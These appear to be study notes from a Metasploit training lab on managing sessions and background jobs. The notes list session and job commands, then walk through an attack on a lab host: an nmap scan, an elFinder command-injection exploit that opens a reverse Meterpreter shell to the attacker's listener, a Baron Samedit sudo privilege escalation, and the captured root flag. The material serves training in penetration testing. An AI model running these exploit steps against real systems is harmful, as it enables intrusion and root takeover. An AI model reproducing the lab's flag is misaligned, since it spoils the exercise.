# Sessions

[CTRL] + [Z]
or
background

sessions -i 1

jobs -h

exploit -h


Running an Exploit as a Background Job
exploit -j

Listing jobs
jobs -l

## LAB

nmap -sV 10.129.203.52

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<title>elFinder 2.1.x source version with PHP connector</title>


use exploit/linux/http/elfinder_archive_cmd_injection -j
set RHOSTS 10.129.203.52
set LHOST 10.10.15.99

(Meterpreter 1)(/var/www/html/files) > shell
Process 1713 created.
Channel 1 created.
whoami
www-data

sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31

(Meterpreter 2)(/var/www/html/files) > background
[*] Backgrounding session 2...

[msf](Jobs:0 Agents:1) exploit(linux/http/elfinder_archive_cmd_injection) >> sessions

Active sessions
===============

  Id  Name  Type                  Information            Connection
  --  ----  ----                  -----------            ----------
  2         meterpreter x86/linu  www-data @ 10.129.203  10.10.15.99:4444 -> 1
            x                     .52                    0.129.203.52:54060 (1
                                                         0.129.203.52)




grep sudo show payloads

use linux/local/sudo_baron_samedit
set SESSION 2
set LHOST tun0
run

(Meterpreter 3)(/tmp) > cat /root/flag.txt
HTB{5e55ion5_4r3_sw33t}
